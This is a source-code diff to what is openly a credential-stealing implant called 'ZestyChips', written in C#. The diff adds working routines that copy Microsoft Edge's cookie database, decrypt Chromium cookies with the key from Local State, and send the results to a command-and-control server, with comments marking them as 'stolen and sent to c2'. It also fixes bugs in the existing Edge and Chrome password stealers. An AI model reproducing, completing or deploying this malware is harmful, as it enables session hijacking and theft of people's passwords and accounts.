@@ -38,10 +38,116 @@ namespace ZestyChips
         private static void Edge() {
             StealEdgePasswords();
             StealEdgeCookies();
+
         }
 
-        private static void StealEdgeCookies() {
+        private static void GetChromiumCookies(string localStatePath, SQLiteDataReader sdr, ref Dictionary<string, string> masterDictionary) {
+            // decode & decrypt the encryption key
+            while (sdr.Read()) {
+                byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
+                // decypt password_value
+                byte[] encryptionKey = GetChromiumEncryptionKey(localStatePath);
 
+                // decrypt encrypted data from chrome
+                using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
+                    using (BinaryReader binaryReader = new BinaryReader(memoryStream)) {
+                        byte[] skippedBytes = binaryReader.ReadBytes(3); 
+
+                        byte[] nonce = binaryReader.ReadBytes(12);
+                        byte[] cipherTextWithTag = binaryReader.ReadBytes(rawEncryptedChromeRow.Length - 3 - 12); // remaining bytes are ciphertext plus tag
+
+                        byte[] cipherText = new byte[cipherTextWithTag.Length - 16];
+                        byte[] tag = new byte[16];
+                        Array.Copy(cipherTextWithTag, 0, cipherText, 0, cipherText.Length);
+                        Array.Copy(cipherTextWithTag, cipherText.Length, tag, 0, tag.Length);
+
+                        byte[] decryptedData = new byte[cipherText.Length];
+
+                        using (AesGcm aesGcm = new AesGcm(encryptionKey, tag.Length)) {
+                            try {
+                                aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
+                                string decryptedString = Encoding.UTF8.GetString(decryptedData);
+
+                                // iterate through each row and store into our masterDictionary
+                                string key = sdr["host_key"].ToString();
+                                object value = sdr["name"];
+
+                                // if the key (site) already exists in masterDictionary, append the data to that key with data_key=data_val
+                                // else, add a new key-value pair.
+                                // all key vals are split with 3 pipes, e.g. key|||val to negate any potential b64 issues or cookie encoding 
+                                // issues where the cookie uses an =
+                                if (masterDictionary.ContainsKey(key)) {
+                                    Dictionary<string, string> dictionary2 = masterDictionary;
+                                    dictionary2[key] = string.Concat(new string[] {
+                                        dictionary2[key],
+                                        (value != null) ? value.ToString() : null,
+                                        "|||",
+                                        decryptedString,
+                                        "; "
+                                    });
+                                } else {
+                                    masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "|||" + decryptedString + "; ");
+                                }
+                            }
+                            catch (Exception ex) {
+                                Helpers.PrintFail($"failed to decrypt data: {ex}");
+                                return;
+                            }
+                        }
+                    }
+                }
+            }
+        } 
+
+        private static void StealEdgeCookies() {
+            string cookieLoc = "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
+            string localState = "/../Local/Microsoft/Edge/User Data/Local State";
+
+            // check if we have edge data in the first place
+            bool hasEdgeData = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + cookieLoc);
+            if (!hasEdgeData) {
+                Program.SendBase64EncodedData("Edge cookies not found");
+                Helpers.PrintFail("edge cookies not found");
+                return;
+            }
+
+            string sourceFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + cookieLoc;
+            string filename = "ec";
+
+            for (;;) {
+                try {
+                    File.Copy(sourceFile, filename, true);
+                    break;
+                } catch (Exception ex) {
+                    // exception will throw most likely if edge is open
+                    // implant will continually run until edge is closed / process terminated
+                    Helpers.PrintFail($"failed to copy edge data, {ex.Message}");
+                    Thread.Sleep(10000); // slp 10 sec
+                }
+            }
+
+            try {
+                // connect to the db file and select data
+                SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filename}");
+                sqliteConnection.Open();
+                SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", sqliteConnection);
+                SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
+
+                // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
+                Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
+
+                // get the chromium cookies passing the masterDict in as a reference so we can edit it
+                GetChromiumCookies(localState, sdr, ref masterDictionary);
+                
+                 // serialise to JSON and ret
+                string finalData = JsonSerializer.Serialize(masterDictionary);
+                Program.SendBase64EncodedData(finalData);
+                Helpers.PrintSuccess("edge cookies stolen and sent to c2.");
+
+            } catch (Exception ex) {
+                Helpers.PrintFail($"error parsing Edge cookie data: {ex.Message}");
+                return;
+            }
         }
         
         /*
@@ -50,16 +156,17 @@ namespace ZestyChips
         private static void StealEdgePasswords() {
             string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
             string edgeFinalData = string.Empty;
+            string localState = "/../Local/Microsoft/Edge/User Data/Local State";
 
             // two structures for saving our results into
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
             List<string> passwordResultsList = new List<string>();
 
             // check if we have edge data in the first place
-            bool hasEdgeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
-            if (hasEdgeData) {
-                Program.SendBase64EncodedData("Edge not found");
-                Helpers.PrintFail("edge not found");
+            bool hasEdgeData = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
+            if (!hasEdgeData) {
+                Program.SendBase64EncodedData("Edge login data not found");
+                Helpers.PrintFail("edge login data not found");
                 return;
             }
 
@@ -86,7 +193,7 @@ namespace ZestyChips
                 SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
                 
                 // decypt password_value
-                byte[] key = GetChromiumEncryptionKey("/../Local/Microsoft/Edge/User Data/Local State");
+                byte[] key = GetChromiumEncryptionKey(localState);
                 while (sdr.Read()) {
                     object usernameValue = sdr["username_value"];
                     object actionURL = sdr["action_url"];
@@ -136,10 +243,10 @@ namespace ZestyChips
         * Returns a string, json serialised data
         */
         private static void StealChromeData(string path, string fileSaveName) {
-            bool hasChromeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
+            bool hasChromeData = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
             string result = string.Empty;
 
-            if (hasChromeData) {
+            if (!hasChromeData) {
                 Program.SendBase64EncodedData("Chrome not found");
                 Helpers.PrintFail("chrome not found");
                 return;
@@ -196,6 +303,8 @@ namespace ZestyChips
         * Decrypt password store, note passwords are separated from username with 3 pipes |||
         */
         private static string DecryptChromePasswords(string dataSourceFile) {
+            string localState = "/../Local/Google/Chrome/User Data/Local State";
+
             // open the Chrome cookies database
             SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
             sqliteConnection.Open();
@@ -203,7 +312,7 @@ namespace ZestyChips
             SQLiteDataReader sdr = sqliteCommand.ExecuteReader();
 
             // get the encryption key Chrome is using
-            byte[] encryptionKey = GetChromiumEncryptionKey("/../Local/Google/Chrome/User Data/Local State");
+            byte[] encryptionKey = GetChromiumEncryptionKey(localState);
 
             // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
@@ -325,6 +434,8 @@ namespace ZestyChips
 
         private static string DecryptChromeCookies(string dataSourceFile) {
 
+            string localState = "/../Local/Google/Chrome/User Data/Local State";
+
             // open the Chrome cookies database
             SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={dataSourceFile}");
             sqliteConnection.Open();
@@ -334,62 +445,8 @@ namespace ZestyChips
             // dictionary to store the result of each iteration of data so we can concat into 1 json object to return
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
 
-
-            // decode & decrypt the encryption key
-            while (sdr.Read()) {
-                byte[] rawEncryptedChromeRow = (byte[])sdr["encrypted_value"];
-                byte[] encryptionKey = GetChromiumEncryptionKey("/../Local/Google/Chrome/User Data/Local State");
-
-                // decrypt encrypted data from chrome
-                using (MemoryStream memoryStream = new MemoryStream(rawEncryptedChromeRow)) {
-                    using (BinaryReader binaryReader = new BinaryReader(memoryStream)) {
-                        byte[] skippedBytes = binaryReader.ReadBytes(3); 
-
-                        byte[] nonce = binaryReader.ReadBytes(12);
-                        byte[] cipherTextWithTag = binaryReader.ReadBytes(rawEncryptedChromeRow.Length - 3 - 12); // remaining bytes are ciphertext plus tag
-
-                        byte[] cipherText = new byte[cipherTextWithTag.Length - 16];
-                        byte[] tag = new byte[16];
-                        Array.Copy(cipherTextWithTag, 0, cipherText, 0, cipherText.Length);
-                        Array.Copy(cipherTextWithTag, cipherText.Length, tag, 0, tag.Length);
-
-                        byte[] decryptedData = new byte[cipherText.Length];
-
-                        using (AesGcm aesGcm = new AesGcm(encryptionKey, tag.Length)) {
-                            try {
-                                aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
-                                string decryptedString = Encoding.UTF8.GetString(decryptedData);
-
-                                // iterate through each row and store into our masterDictionary
-                                string key = sdr["host_key"].ToString();
-                                object value = sdr["name"];
-
-                                // if the key (site) already exists in masterDictionary, append the data to that key with data_key=data_val
-                                // else, add a new key-value pair.
-                                if (masterDictionary.ContainsKey(key)) {
-                                    Dictionary<string, string> dictionary2 = masterDictionary;
-                                    dictionary2[key] = string.Concat(new string[] {
-                                        dictionary2[key],
-                                        (value != null) ? value.ToString() : null,
-                                        "=",
-                                        decryptedString,
-                                        "; "
-                                    });
-                                } else {
-                                    masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "=" + decryptedString + "; ");
-                                }
-                            }
-                            catch (Exception ex) {
-                                Helpers.PrintFail($"failed to decrypt data: {ex}");
-                                // memoryStream.Close();
-                                return "Error decrypting chrome data";
-                            }
-                        }
-                    }
-                    // memoryStream.Close();
-                }
-
-            }
+            // get the chromium cookies passing the masterDict in as a reference so we can edit it
+            GetChromiumCookies(localState, sdr, ref masterDictionary);
 
             // serialise to JSON and ret
             return JsonSerializer.Serialize(masterDictionary);
